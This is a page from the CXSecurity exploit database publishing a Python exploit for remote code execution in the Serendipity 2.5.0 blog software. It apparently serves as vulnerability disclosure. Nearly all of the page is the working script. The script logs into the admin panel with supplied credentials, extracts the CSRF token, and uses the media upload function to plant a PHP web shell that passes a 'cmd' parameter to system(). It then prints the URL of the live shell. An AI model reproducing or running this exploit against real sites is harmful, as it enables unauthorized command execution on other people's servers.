---
title: Serendipity 2.5.0 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2024060010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-05
fetch_date: 2025-10-06T16:55:22.620400
---

# Serendipity 2.5.0 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Serendipity 2.5.0 Remote Code Execution** **2024.06.04**  Credit:  **[Ahmet Umit Bayram](https://cxsecurity.com/author/Ahmet%2BUmit%2BBayram/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: Serendipity 2.5.0 - Remote Code Execution (RCE)
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 26.04.2024
# Vendor Homepage: https://docs.s9y.org/
# Software Link:https://www.s9y.org/latest
# Tested Version: v2.5.0 (latest)
# Tested on: MacOS
import requests
import time
import random
import string
from bs4 import BeautifulSoup
def generate\_filename(extension=".inc"):
return ''.join(random.choices(string.ascii\_letters + string.digits, k=5)) +
extension
def get\_csrf\_token(response):
soup = BeautifulSoup(response.text, 'html.parser')
token = soup.find('input', {'name': 'serendipity[token]'})
return token['value'] if token else None
def login(base\_url, username, password):
print("Logging in...")
time.sleep(2)
session = requests.Session()
login\_page = session.get(f"{base\_url}/serendipity\_admin.php")
token = get\_csrf\_token(login\_page)
data = {
"serendipity[action]": "admin",
"serendipity[user]": username,
"serendipity[pass]": password,
"submit": "Login",
"serendipity[token]": token
}
headers = {
"Content-Type": "application/x-www-form-urlencoded",
"Referer": f"{base\_url}/serendipity\_admin.php"
}
response = session.post(f"{base\_url}/serendipity\_admin.php", data=data,
headers=headers)
if "Add media" in response.text:
print("Login Successful!")
time.sleep(2)
return session
else:
print("Login Failed!")
return None
def upload\_file(session, base\_url, filename, token):
print("Shell Preparing...")
time.sleep(2)
boundary = "---------------------------395233558031804950903737832368"
headers = {
"Content-Type": f"multipart/form-data; boundary={boundary}",
"Referer": f"{base\_url}
/serendipity\_admin.php?serendipity[adminModule]=media"
}
payload = (
f"--{boundary}\r\n"
f"Content-Disposition: form-data; name=\"serendipity[token]\"\r\n\r\n"
f"{token}\r\n"
f"--{boundary}\r\n"
f"Content-Disposition: form-data; name=\"serendipity[action]\"\r\n\r\n"
f"admin\r\n"
f"--{boundary}\r\n"
f"Content-Disposition: form-data; name=\"serendipity[adminModule]\"\r\n\r\n"
f"media\r\n"
f"--{boundary}\r\n"
f"Content-Disposition: form-data; name=\"serendipity[adminAction]\"\r\n\r\n"
f"add\r\n"
f"--{boundary}\r\n"
f"Content-Disposition: form-data; name=\"serendipity[userfile][1]\";
filename=\"{filename}\"\r\n"
f"Content-Type: text/html\r\n\r\n"
"<html>\n<body>\n<form method=\"GET\" name=\"<?php echo
basename($\_SERVER['PHP\_SELF']); ?>\">\n"
"<input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">\n<input
type=\"SUBMIT\" value=\"Execute\">\n"
"</form>\n<pre>\n<?php\nif(isset($\_GET['cmd']))\n{\nsystem($\_GET['cmd']);\n}
\n?>\n</pre>\n</body>\n</html>\r\n"
f"--{boundary}--\r\n"
)
response = session.post(f"{base\_url}
/serendipity\_admin.php?serendipity[adminModule]=media", headers=headers,
data=payload.encode('utf-8'))
if f"File {filename} successfully uploaded as" in response.text:
print(f"Your shell is ready: {base\_url}/uploads/{filename}")
else:
print("Exploit Failed!")
def main(base\_url, username, password):
filename = generate\_filename()
session = login(base\_url, username, password)
if session:
token = get\_csrf\_token(session.get(f"{base\_url}
/serendipity\_admin.php?serendipity[adminModule]=media"))
upload\_file(session, base\_url, filename, token)
if \_\_name\_\_ == "\_\_main\_\_":
import sys
if len(sys.argv) != 4:
print("Usage: python script.py <siteurl> <username> <password>")
else:
main(sys.argv[1], sys.argv[2], sys.argv[3])

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060010)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top